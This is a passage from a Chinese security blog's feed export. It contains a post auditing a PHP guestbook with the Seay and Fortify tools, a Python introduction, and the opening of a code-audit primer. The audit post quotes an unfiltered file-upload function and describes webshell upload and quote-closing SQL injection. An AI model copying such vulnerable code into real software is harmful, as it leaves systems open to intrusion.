class="literal">true</span>);</span><br><span class="line"><span class="variable">$fileName</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y_m_d_H_i_s&#x27;</span>, <span class="title function_ invoke__">time</span>()).<span class="string">&quot;_&quot;</span>.(<span class="title function_ invoke__">rand</span>(<span class="number">100000</span>,<span class="number">900000</span>));</span><br><span class="line"><span class="variable">$fileType</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;user_pic&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="variable">$fileName</span> = <span class="string">&quot;Upload_&quot;</span>.<span class="variable">$fileName</span>.<span class="variable">$fileType</span>;</span><br><span class="line"><span class="variable">$destination</span> =  <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$fileName</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;user_pic&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$destination</span>);</span><br><span class="line"><span class="variable">$filePath</span>  = <span class="variable">$dir_bak</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$fileName</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$filePath</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有做任何的过滤和限制 , 直接拼接的文件后缀<br><strong>这个工具挺喜欢echo的，碰到就报XSS。</strong></p><h1 id="五、Seay"><a href="#五、Seay" class="headerlink" title="五、Seay"></a>五、Seay</h1><p>软件介绍</p><ul><li>Seay代码审计 , 由阿里巴巴尹毅使用C#开发的针对PHP代码安全审计软件</li><li>执行审计常见web安全漏洞，并且能够进行代码调试，函数定位，语法高亮等。</li><li>运行在Windows系统上</li></ul><p>Seay实践： </p><ol><li>新建项目，打开源码文件夹，点击自动审计即可  </li><li>误报可能会很多，扫描完成生成报告即可查看</li></ol><p><img src="http://120.48.107.243:9090/blog/2023/04/01/d9076cafa2654a948c29999883ef920f.png" alt="在这里插入图片描述"></p><p>实验 : 使用Seay源代码审计工具对留言板源码进行扫描</p><h2 id="1、Exec命令执行"><a href="#1、Exec命令执行" class="headerlink" title="1、Exec命令执行"></a>1、Exec命令执行</h2><p>命令执行 Exec 函数  , 找到函数 , 右键定位 函数 , 发现是自定义函数 , 并不是命令执行 , 误报</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/a28aea14c9596daf875ec4a2cabe5f05.png" alt="image-20220401172728037"></p><h2 id="2、sql注入"><a href="#2、sql注入" class="headerlink" title="2、sql注入"></a>2、sql注入</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/709ce37be8b5b01b1a531547d1464ed6.png" alt="image-20220401203835639"></p><p>直接拼接的sql语句 , 变量值可控 , 存在sql注入漏洞 , 可以通过echo当前语句 , 直接查看sql语句</p><p>接着又是 命令执行 Exec 函数 </p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/8b9c6e96fba15b61cc815f804ec173ed.png" alt="image-20220401204619485"></p><p>误报</p><h2 id="3、sql注入"><a href="#3、sql注入" class="headerlink" title="3、sql注入"></a>3、sql注入</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/5864099ca93063ed816ae1bdd8e4880a.png" alt="image-20220401204737937"></p><p>直接拼接的sql语句 , 变量值可控 , 存在sql注入漏洞 , 可以通过echo当前语句 , 直接查看sql语句</p><p>剩下的sql注入全是直接拼接的就不一个一个介绍了 , 然后Exec函数是误报</p><h2 id="4、文件上传"><a href="#4、文件上传" class="headerlink" title="4、文件上传"></a>4、文件上传</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/7934f89d100447493ebe7aaa858de230.png" alt="image-20220401205043168"></p><p>没有对文件名做任何的处理和过滤 , 可以直接上传webshell</p><h2 id="5、伪造客户端ip"><a href="#5、伪造客户端ip" class="headerlink" title="5、伪造客户端ip"></a>5、伪造客户端ip</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/423c5f57e14e2b68cfc90ef34e754bdd.png" alt="image-20220401205325335"></p><p>burp插件就可以演示 , 但是这个源码中没有调用这个函数的地方</p><p>小总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Seay 感觉还不错  , 最起码sql注入可以检测出来 , 不会有xss误报 , 然后函数定位功能很好用</span><br><span class="line">缺点 : 逻辑漏洞无法检测 , 当然这也是工具的通病</span><br></pre></td></tr></table></figure><h1 id="六、fortify"><a href="#六、fortify" class="headerlink" title="六、fortify"></a>六、fortify</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fortify SCA ，是HP的产品 ，是一个静态的、白盒的软件源代码安全测试工具。</span><br><span class="line">它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应</span><br><span class="line">用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集</span><br><span class="line">进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理</span><br><span class="line">报告。扫描的结果包含详细的安全漏洞信息、安全知识说明、修复意见。</span><br></pre></td></tr></table></figure><p>Foritfy SCA</p><p>主要包含的五大分析引擎 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数据流引擎 : 跟踪,记录并分析程序中的数据传递过程所产生的安全问题。</span><br><span class="line">语义引擎 : 分析程序中不安全的函数,方法的使用的安全问题。</span><br><span class="line">结构引擎 : 分析程序上下文环境,结构中的安全问题。</span><br><span class="line">控制流引擎 : 分析程序特定时间,状态下执行操作指令的安全问题。</span><br><span class="line">配置引擎 : 分析项目配置文件中的敏感信息和配置缺失的安全问题。</span><br></pre></td></tr></table></figure><p>特有的X-Tir跟踪器 : 跨跃项目的上下层次,贯穿程序来综合分析问题</p><p>支持的语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. asp.net     </span><br><span class="line">2. VB.Net     </span><br><span class="line">3. c#.Net     </span><br><span class="line">4. ASP     </span><br><span class="line">5. VBscript     </span><br><span class="line">6. VS6     </span><br><span class="line">7.java     </span><br><span class="line">8.JSP     </span><br><span class="line">9.javascript     </span><br><span class="line">10. HTML     </span><br><span class="line">11. XML     </span><br><span class="line">12. C/C++     </span><br><span class="line">13.PHP     </span><br><span class="line">14.T-SQL     </span><br><span class="line">15.PL/SQL     </span><br><span class="line">16. Action script      </span><br><span class="line">17. Object-C (iphone-2012/5)     </span><br><span class="line">18. ColdFusion5.0 - 选购     </span><br><span class="line">19. python -选购     </span><br><span class="line">20. COBOL - 选购     </span><br><span class="line">21.SAP-ABAP -选购</span><br></pre></td></tr></table></figure><h2 id="1、导出报告"><a href="#1、导出报告" class="headerlink" title="1、导出报告"></a>1、导出报告</h2><p>点击tools-reports,有两种报告模式：Generate BIRT Report 和 Generate Legacy Report</p><p>选择 Generate BIRT Report</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/c934fd4df19ca110ef322f57646285fa.png" alt="image-20220403121853769"></p><p>不过默认导出的是英文报告 , 一般很少使用该功能</p><h2 id="2、xss漏洞"><a href="#2、xss漏洞" class="headerlink" title="2、xss漏洞"></a>2、xss漏洞</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/0732804bfd97a03cedc91e2bf859c964.png" alt="image-20220403122439339"></p><p>主要介绍工具如何使用 , 关于漏洞的分析 , 复现 , 前面已经搞过了 , 该漏洞是误报</p><h2 id="3、弱口令"><a href="#3、弱口令" class="headerlink" title="3、弱口令"></a>3、弱口令</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/e5547988044762ead6eb476cfead841c.png" alt="image-20220403122639560"></p><h2 id="4、文件上传-1"><a href="#4、文件上传-1" class="headerlink" title="4、文件上传"></a>4、文件上传</h2><p>工具扫出来提示的是 路径操控</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/04ab31233da5359101a05cfc7e53526e.png" alt="image-20220403123255388"></p><h2 id="5、sql注入"><a href="#5、sql注入" class="headerlink" title="5、sql注入"></a>5、sql注入</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/8943910fccc9bdc8ce75f13e53b13623.png" alt="image-20220403123452857"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/0cdeae346f94948ab92e1743905b8e55.png" alt="image-20220403123529295"></p><p>搜索行sql注入 , 可以看到是直接拼接的sql语句, 虽然有单引号保护 , 但是可以通过闭合单引号绕过</p><h1 id="七、工具的不足"><a href="#七、工具的不足" class="headerlink" title="七、工具的不足"></a>七、工具的不足</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">工具本身存在一定量的误报或者漏报</span><br><span class="line">扫描结果需要大量人工确定甄别</span><br><span class="line">csrf, 越权, 逻辑漏洞等扫不到</span><br><span class="line">如用多种语言开发的软件，则需单独分析</span><br><span class="line"></span><br><span class="line">不能自动收集常见的代码安全问题</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（一）</title>
      <link href="/2022/01/13/python_one/"/>
      <url>/2022/01/13/python_one/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140003166.png" alt="在这里插入图片描述"></p><h1 id="一、编程语言的分类"><a href="#一、编程语言的分类" class="headerlink" title="一、编程语言的分类"></a>一、编程语言的分类</h1><h2 id="1、机器语言"><a href="#1、机器语言" class="headerlink" title="1、机器语言"></a>1、机器语言</h2><p>机器语言是机器能直接识别的程序语言或指令代码，无需经过翻译，每一操作码在计算机内部都有相应的电路来完成它，或指不经翻译即可为机器直接理解和接受的程序语言或指令代码。机器语言使用绝对地址和绝对操作码。不同的计算机都有各自的机器语言，即指令系统。从使用的角度看，机器语言是最低级的语言。<br>#机器语言<br>    用二进制代码0和1描述的指令称为机器指令，由于计算机内部是基于二进制指令工作的，所以机器语言是直接控制计算机硬件。</p><pre><code>用机器语言编写程序，编程人员要首先熟记所用计算机的全部指令代码以及代码的含义，然后在编写程序时，程序员得自己处理每条指令和每一数据的存储分配和输入输出，还得记住编程过程中每步所使用的工作单元处在何种状态。这是一件十分繁琐的工作。编写程序花费的时间往往是实际运行时间的几十倍或几百倍。而且，编出的程序全是些0和1的指令代码，直观性差，不便阅读和书写，还容易出错，且依赖于具体的计算机硬件型号，局限性很大。除了计算机生产厂家的专业人员外，绝大多数的程序员已经不再去学习机器语言了。机器语言是被微处理器理解和使用的，存在有多至100000种机器语言的指令，下述是一些简单示例#指令部份的示例0000 代表 加载（LOAD）0001 代表 存储（STORE）...#暂存器部份的示例0000 代表暂存器 A0001 代表暂存器 B...#存储器部份的示例000000000000 代表地址为 0 的存储器000000000001 代表地址为 1 的存储器000000010000 代表地址为 16 的存储器100000000000 代表地址为 2^11 的存储器#集成示例0000,0000,000000010000 代表 LOAD A, 160000,0001,000000000001 代表 LOAD B, 10001,0001,000000010000 代表 STORE B, 160001,0001,000000000001 代表 STORE B, 1[1]</code></pre><h2 id="2、汇编语言"><a href="#2、汇编语言" class="headerlink" title="2、汇编语言"></a>2、汇编语言</h2><p>汇编语言仅仅是用一个英文标签代表一组二进制指令( 之间是映射关系)，毫无疑问，比起机器语言，汇编语言是一种进步，但汇编语言的本质仍然是直接操作硬件，因此汇编语言仍是比较低级&#x2F;底层的语言、贴近计算机硬件 。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">汇编语言</span><br><span class="line">汇编语言的实质和机器语言是相同的，都是直接对硬件操作，只不过指令采用了英文缩写的标识符，更容易识别和记忆。它同样需要编程者将每一步具体的操作用命令的形式写出来。汇编程序的每一句指令只能对应实际操作过程中的一个很细微的动作。例如移动、自增，因此汇编源程序一般比较冗长、复杂、容易出错，而且使用汇编语言编程需要有更多的计算机专业知识，但汇编语言的优点也是显而易见的，用汇编语言所能完成的操作不是一般高级语言所能够实现的，而且源程序经汇编生成的可执行文件不仅比较小，而且执行速度很快。</span><br><span class="line"></span><br><span class="line">汇编的hello world，打印一句hello world, 需要写十多行，如下</span><br><span class="line"></span><br><span class="line">; hello.asm </span><br><span class="line">section.data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">        section .text            ; 代码段声明</span><br><span class="line">        global _start            ; 指定入口函数</span><br><span class="line">        _start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                               ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure><h2 id="3、高级语言"><a href="#3、高级语言" class="headerlink" title="3、高级语言"></a>3、高级语言</h2><h3 id="（1）编译型语言"><a href="#（1）编译型语言" class="headerlink" title="（1）编译型语言"></a>（1）编译型语言</h3><p>编译型语言是指程序在执行之前需要一个专门的编译过程，把程序源文件编译为机器语言的文件，运行时不需要重新编译，执行效率高</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 1、执行效率高</span><br><span class="line">编译是指在应用源程序执行之前，就将程序源代码“翻译”成目标代码（即机器语言），</span><br><span class="line">因此其目标程序可以脱离其语言环境独立执行，使用比较方便，执行效率较高。</span><br><span class="line"></span><br><span class="line"># 2、开发效率低：</span><br><span class="line">应用程序一旦需要修改，必须先修改源代码，然后重新编译、生成新的目标文件才能执行，</span><br><span class="line">而在只有目标文件而没有源代码，修改会很不方便。所以开发效率低于解释型</span><br><span class="line"></span><br><span class="line"># 3、跨平台性差</span><br><span class="line">编译型代码是针对某一个平台翻译的，当前平台翻译的结果无法拿到不同的平台使用，</span><br><span class="line">针对不同的平台必须重新编译，即跨平台性差</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 其他</span><br><span class="line">现在大多数的编程语言都是编译型的。</span><br><span class="line">编译程序将源程序翻译成目标程序后保存在另一个文件中，</span><br><span class="line">该目标程序可脱离编译程序直接在计算机上多次运行。</span><br><span class="line">大多数软件产品都是以目标程序形式发行给用户的，</span><br><span class="line">不仅便于直接运行，同时又使他人难于盗用其中的技术。</span><br><span class="line">C、C++、Ada、Pascal , go , c# 都是编译实现的</span><br></pre></td></tr></table></figure><h3 id="（2）解释型语言"><a href="#（2）解释型语言" class="headerlink" title="（2）解释型语言"></a>（2）解释型语言</h3><p>解释型语言不能直接翻译成机器语言，而是先翻译成中间代码 （只与解释器有关，和平台无关），再由解释器对中间代码进行解释运行 ，而且代码的每次运行，都要有解释器的参与，而且是逐行解释，相对于编译性语言执行效率偏慢。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1、执行效率低</span><br><span class="line">解释型语言的实现中，解释器并不产生目标机器代码，而是产生易于执行的中间代码。</span><br><span class="line">这种中间代码与机器代码是不同的，中间代码的解释是由软件支持的，不能直接使用硬件，</span><br><span class="line">软件解释器通常会导致执行效率较低。</span><br><span class="line"># 2、开发效率高</span><br><span class="line">用解释型语言编写的程序是由另一个可以理解中间代码的解释程序执行的，与编译程序不同的是，</span><br><span class="line">解释程序的任务是逐一将源程序的语句解释成可执行的机器指令，不需要将源程序翻译成目标代码再执行。</span><br><span class="line">解释程序的优点是当语句出现语法错误时，可以立即引起程序员的注意，而程序员在程序开发期间就能进行校正。</span><br><span class="line"># 3、跨平台性强</span><br><span class="line">代码运行是依赖于解释器，不同平台有对应版本的解释器，所以解释型的跨平台性强</span><br><span class="line"># 其他</span><br><span class="line">例如：Tcl、Perl , VBScript、Ruby , JavaScript，php , python 等</span><br></pre></td></tr></table></figure><h1 id="二、Python语言"><a href="#二、Python语言" class="headerlink" title="二、Python语言"></a>二、Python语言</h1><h2 id="1、Python发展史"><a href="#1、Python发展史" class="headerlink" title="1、Python发展史"></a>1、Python发展史</h2><p>1989年，Guido (龟叔) 开始写Python语言的编译器。 1991年，第一个Python编译器诞生。它是用C语言实现的，并能够调用C语言的库文件。从一出生，Python已经具有了：类，函数，异常处理，包含表和词典在内的核心数据类型，以及模块为基础的拓展系统。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Granddaddy of Python web frameworks, Zope 1 was released in 1999</span><br><span class="line"></span><br><span class="line">Python 1.0 - January 1994 增加了 lambda, map, filter and reduce.</span><br><span class="line"></span><br><span class="line">Python 2.0 - October 16, 2000，加入了内存回收机制，构成了现在Python语言框架的基础</span><br><span class="line"></span><br><span class="line">Python 2.4 - November 30, 2004, 同年目前最流行的WEB框架Django 诞生</span><br><span class="line"></span><br><span class="line">Python 2.5 - September 19, 2006</span><br><span class="line"></span><br><span class="line">Python 2.6 - October 1, 2008</span><br><span class="line"></span><br><span class="line">Python 2.7 - July 3, 2010</span><br><span class="line"></span><br><span class="line">In November 2014, it was announced that Python 2.7 would be supported until 2020, and reaffirmed that there would be no 2.8 release as users were expected to move to Python 3.4+ as soon as possible</span><br></pre></td></tr></table></figure><p>Python 3.0 - December 3, 2008 (细心的读者会发现，08年时就推出了3.0，2010年反而又推出了2.7？是因为3.0不向下兼容2.0，而很多公司已经基于2.0版本开发出了大量程序，公司已然投入了大量的人财物力，这就导致大家都拒绝升级3.0，无奈官方只能推出2.7过渡版本，之后我们都应该采用3.0解释器开发程序，但为了方便读者维护2.0版本的软件，我们在遇到两种版本的差异时会专门指出来)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Python 3.1 - June 27, 2009</span><br><span class="line"></span><br><span class="line">Python 3.2 - February 20, 2011</span><br><span class="line"></span><br><span class="line">Python 3.3 - September 29, 2012</span><br><span class="line"></span><br><span class="line">Python 3.4 - March 16, 2014</span><br><span class="line"></span><br><span class="line">Python 3.5 - September 13, 2015</span><br><span class="line"></span><br><span class="line">Python 3.6 - 2016-12-23 发布python3.6.0版</span><br><span class="line"></span><br><span class="line">python 3.7</span><br><span class="line"></span><br><span class="line">python 3.8 </span><br><span class="line"></span><br><span class="line">python 3.9</span><br><span class="line"></span><br><span class="line">python 3.10</span><br><span class="line"></span><br><span class="line">python 3.11</span><br><span class="line"></span><br><span class="line">其中3.7是一个小的分水岭 , 更新了很多异步的一些语法</span><br></pre></td></tr></table></figure><h2 id="2、Python解释器的种类"><a href="#2、Python解释器的种类" class="headerlink" title="2、Python解释器的种类"></a>2、Python解释器的种类</h2><p>官方的Python解释器本质就是基于C语言开发的一个软件，该软件的功能就是读取以.py结尾的文件内容，然后按照Guido定义好的语法和规则去翻译并执行相应的代码。这种用C实现的解释器称为CPython，它是python领域性能最好，应用最广泛的一款解释器，我们在后面提到的解释器指的都是Cpython解释器。但其实解释器作为一款应用软件，完全可以采用其他语言来开发，只要能解释python这门语言的语法即可。<br>Python解释器的一些种类如下，简单了解即可。<br>###（1）CPython<br>当从Python官方网站下载并安装好Python3.8后，就直接获得了一个官方版本的解释器：Cpython，这个解释器是用C语言开发的，所以叫CPython，在命名行下运行python，就是启动CPython解释器，CPython是使用最广的Python解释器。<br>###（2）IPython<br>IPython是基于CPython之上的一个交互式解释器，也就是说，IPython只是在交互方式上有所增强，但是执行Python代码的功能和CPython是完全一样的，好比很多国产浏览器虽然外观不同，但内核其实是调用了IE。<br>###（3）PyPy<br>PyPy是另一个Python解释器，它的目标是执行速度，PyPy采用JIT技术，对Python代码进行动态编译，所以可以显著提高Python代码的执行速度。<br>###（4）Jython<br>Jython是运行在Java平台上的Python解释器，可以直接把Python代码编译成Java字节码执行。<br>###（5）IronPython<br>IronPython和Jython类似，只不过IronPython是运行在微软.Net平台上的Python解释器，可以直接把Python代码编译成.Net的字节码。<br>##3、运行Python程序的两种方式<br>###（1）交互式<br>即时得到程序的运行结果，但是代码没有永久保存，多用于调试，比如 可以拿来当计算器用。打开命令行，输入 python，然后就可以编写代码了（注意编写用的符号全是英文的）<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6d818ee1edf147dbb5ef3efdf6117c88.png" alt="在这里插入图片描述"><br>退出是 <code>exit()</code> </p><h3 id="（2）脚本的方式"><a href="#（2）脚本的方式" class="headerlink" title="（2）脚本的方式"></a>（2）脚本的方式</h3><p>把程序写到一个文件中（约定俗称文件后缀名为.py）, 然后用python解释器，解释执行里面的内容。</p><p><code>python解释器 + 空格 + 文件路径</code>（注意命令路径中不能有空格）</p><p>示例</p><p>在桌面新建一个<code>demo.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello word&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后使用python解释器运行该py文件<br><img src="http://120.48.107.243:9090/blog/2023/04/03/52f630d2107c4f65b0c8ce8dfdd9763f.png" alt="在这里插入图片描述"><br>虽然这样可以将代码永久保存了，但是每次执行都要用命令行，而且用的文本编辑器，写代码无任何提示。（后面会介绍到集成开发环境 ), 即使用 <code>pycharm</code> 编写py脚本<br>##4、一个Python程序运行的三个步骤<br>python <code> D:\桌面\demo.py</code>    执行python程序经历的三个步骤</p><ul><li>1.先启动python解释器，相当于启动了一个文本编辑器</li><li>2.解释器会发送系统调用，把demo.py的内容，从硬盘中读取出来，<br>  并加载到内存，此时demo.py中的内容全部为普通字符，没有任何意义</li><li>3.按下回车，解释器开始解释执行刚刚读到内存的demo.py的代码，开始识别python语法 , 执行代码<br><strong>对比文本编辑器读取 C:\a\b\c.py文件 内容也经历了三个步骤</strong><br>1、先启动文本编辑器<br>2、文本编辑器会发送系统调用，把c.py的内容从硬盘读入内存<br>3、文本编辑会将刚刚读入内存的内容控制输出到屏幕上，让用户看到结果<br><strong>总结：</strong><br>二者在前两个阶段做的事情完全一致<br>唯一不同的就是第三个阶段对读入内存的python代码的处理方式不同,<br>一个检测语法是否正确，一个不检测。</li></ul><h1 id="三、Python可以做什么"><a href="#三、Python可以做什么" class="headerlink" title="三、Python可以做什么"></a>三、Python可以做什么</h1><table><thead><tr><th><strong>应用方向</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>网路爬虫</td><td>Google 等搜索引擎公司大量地使用 Python 语言编写网络爬虫。</td></tr><tr><td>数据分析</td><td>用爬虫爬到了大量的数据之后最终的目的就是分析数据。</td></tr><tr><td>机器学习</td><td>机器学习就是人工智能的一个分支，应用有自然语言处理，搜索引擎，各种识别技术，数据挖掘等等。</td></tr><tr><td>WEB应用&#x2F;小程序开发</td><td>国内：豆瓣&#x2F;知乎(以前是python,现在是go) 国外：YouTube 使用的是Python作为WEB开发基础语言。</td></tr><tr><td>APP应用开发</td><td>Python 可以开发OS X，Linux，Windows，iOS，Android 等平台的应用。</td></tr><tr><td>游戏开发</td><td>Python开发的游戏几乎可以运行在所有常用的操作系统里面。</td></tr><tr><td>自动化脚本</td><td>频繁、重复、无脑的操作都可以使用Python脚本代替操作，以此节省大量时间</td></tr><tr><td>#四、Python语言的特点</td><td></td></tr><tr><td>语法简洁 : 弱类型语言不多哔哔</td><td></td></tr><tr><td>可跨平台 : 只要能够安装解释器哪里都能运行</td><td></td></tr><tr><td>应用广泛 : 上到机器学习下到嵌入式</td><td></td></tr><tr><td>可读性强 : 通过强制缩进体现语句间的逻辑关系提高了程序的可读性</td><td></td></tr><tr><td>模式多样 : 语法层面同时支持面向过程和面向对象两种编程方式</td><td></td></tr><tr><td>粘性扩展 : 通过接口和函数集成其他语言编写的代码</td><td></td></tr><tr><td>开源理念 : 解释器众多，代码也能加密…</td><td></td></tr><tr><td>库类丰富 : 再造一个轮子也不嫌多</td><td></td></tr><tr><td>#五、我们安全学习Python是为了什么？</td><td></td></tr></tbody></table><ol><li>python语法简洁 , 容易上手 , 编写一些渗透测试工具更加方便</li><li>相对于其他 c , java等更易于编写poc</li><li>完成一些批量的检测 , 如批量检测漏洞是否存在</li><li>批量利用等等</li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计基础</title>
      <link href="/2021/12/31/code_read_easy/"/>
      <url>/2021/12/31/code_read_easy/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/01/81289fe9058442daa583e21f49ec1813.png" alt="在这里插入图片描述"><br>图片来源于安全客。<br><strong>注意：本篇文章仅用于自我学习与交流，不会过多或不涉及具体操作，不得用于其他用途。</strong></p><h1 id="一、代码审计简介"><a href="#一、代码审计简介" class="headerlink" title="一、代码审计简介"></a>一、代码审计简介</h1><p>顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。——&#x3D;&#x3D;来自百度百科&#x3D;&#x3D;<br>代码审计就是从安全角度对代码进行的安全测试评估，结合丰富的安全知识、编程经验、测试技术、利用静态分析和人工审核的方法寻找代码在架构和编码上的安全缺陷，在代码形成软件产品前将业务软件的安全风险降到最低。<br><strong>实际上感觉就是真正的给你一个网站源码，从网站去找漏洞，而不是按照漏洞去找网站。</strong></p><h1 id="二、代码审计测试方法"><a href="#二、代码审计测试方法" class="headerlink" title="二、代码审计测试方法"></a>二、代码审计测试方法</h1><p>代码审计采用人工审计和静态分析工具辅助的方式进行。<br>人工审计：既能解决内部问题也能解决外部问题，这也是目前最有效率的解决方案，并且在理论上手工代码审计是非常有效的，但人工审计的效率不高，所以我们会采用自动化分析工具辅助人工的方式来提高审计的效率。<br>静态分析工具（也可以叫代码审计工具）：通过一组全面规则，测试机制（里面是已经编写好的程序）和方针在软件开发过程、测试中发现软件的安全缺陷。<br><strong>人工审计和工具最好是结合使用。</strong></p><h1 id="三、代码审计的通用思路"><a href="#三、代码审计的通用思路" class="headerlink" title="三、代码审计的通用思路"></a>三、代码审计的通用思路</h1><h2 id="1、逆向追踪"><a href="#1、逆向追踪" class="headerlink" 